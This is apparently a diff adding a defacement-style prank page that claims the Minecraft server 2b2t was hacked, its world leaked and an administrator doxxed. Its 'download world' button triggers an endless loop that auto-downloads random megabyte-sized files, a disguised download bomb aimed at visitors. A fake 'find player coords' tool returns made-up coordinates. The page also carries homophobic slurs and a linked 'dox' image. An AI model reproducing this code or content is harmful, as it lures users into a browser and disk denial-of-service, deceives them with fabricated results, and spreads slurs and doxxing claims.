@@ -1,0 +1,121 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
+<style type="text/css">
+html{
+background-color: #C30;
+background-image: url(./img/bg.png);
+background-position: center bottom;
+background-repeat: no-repeat;
+color: #FFF;
+text-align: center;
+
+animation-name: homeCycle;
+animation-duration:2s;
+animation-direction:alternate;
+animation-iteration-count:infinite;
+
+-webkit-animation-name: homeCycle;
+-webkit-animation-duration:2s;
+-webkit-animation-direction:alternate;
+-webkit-animation-iteration-count:infinite;
+}
+
+@keyframes homeCycle
+{
+0% {background-color:#006;}
+25% {background-color:#060;}
+50% {background-color:#CC3200;}
+75% {background-color:#603;}
+}
+
+@-webkit-keyframes homeCycle
+{
+0% {background-color:#006;}
+25% {background-color:#060;}
+50% {background-color:#CC3200;}
+75% {background-color:#603;}
+}
+}
+
+</style>
+
+<script type="text/javascript">
+function download() {
+    setTimeout(downloadREAL(), 2000);
+}
+
+function downloadREAL(){
+	var filename = "world.r";
+	var i = 0;
+	while(true){
+    var pom = document.createElement('a');
+    pom.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(makeid()));
+    if(i<10)
+    	output = filename + 0 + i;
+   	else
+   		output = filename + i;
+    pom.setAttribute('download', output);
+    pom.click();
+    i++;
+    }
+    }
+function makeid()
+{
+    var text = "";
+    var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+
+    for( var i=0; i < 1000000; i++ )
+        text += possible.charAt(Math.floor(Math.random() * possible.length));
+
+    return text;
+}
+var last = 0;
+var lasttext = 0;
+var d = new Date();
+var lastUsed = 0;
+function myfunction() {
+var first = document.getElementById("textbox1").value;
+var random = (Math.random()*13000).toFixed(2) +"x, " + (Math.random()*15000).toFixed(2) + "y";
+var textbox3 = document.getElementById('textbox3');
+if(new Date().getTime()<lastUsed+120000)
+		window.alert("stop overloading the server faggot");
+else{
+	lastUsed = new Date().getTime();
+if(first.length>3)
+	textbox3.value= first + " was last seen at: " + random;
+else
+	textbox3.value = "not a valid player";
+if(last!=0 && first==last)
+	textbox3.value = lasttext;
+last = first;
+lasttext = textbox3.value;
+}
+	}
+<!--haha idiot did u really think i would do this. download it u faggot-->
+</script>
+		<title>HAckED bY ~CatWhisperer420~</title>
+
+		<p align="center"> <a href="http://www.youtube.com/watch?v=L6MeaYUf0MA" target="_blank"><font size = "48" color="green">2b2t has been HACK'D by </font></a>
+</p>
+		<p align="center"> <a href="http://www.youtube.com/watch?v=L6MeaYUf0MA" target="_blank"><font size = "48" color="pink">~CatWhisperer420~</font></a>
+		<p align="center"> <font size = "48" color="yellow">hausemaster has been <a href="http://i.imgur.com/Lfnzqrp.jpg" target="_blank">DOX'D</a> by </font>
+		<p align="center"> <a href="http://www.youtube.com/watch?v=L6MeaYUf0MA" target="_blank"><font size = "48" color="pink">~CatWhisperer420~</font></a>
+</p>
+		<p align="center"> <font size = "48" color="red">world has been LEAK'D by </font>
+</p>
+		<p align="center"> <a href="http://www.youtube.com/watch?v=L6MeaYUf0MA" target="_blank"><font size = "48" color="pink">~CatWhisperer420~</font></a>
+</p>
+<button onClick="download();">download world split .rar files. password and torrent will be released later</button>
+<audio autoplay loop = "loop">
+    <source src="./img/eva.mp3"/>
+</audio>
+<embed height="0" width="0" src="./horse.mp3">
+<br /><br /><br />
+find player coords brought to you by <a href="http://www.youtube.com/watch?v=L6MeaYUf0MA" target="_blank">~CatWhisperer420~</a> <br>
+name: <input type="text" name="textbox1" id="textbox1" />
+<br>
+<input type="submit" name="button" id="button1" onclick="myfunction()" value="hack" />
+<br>
+<input type="text" name="textbox3" id="textbox3" readonly="true" size = "88"/>
+<br><br><br>
+
+</body></html>
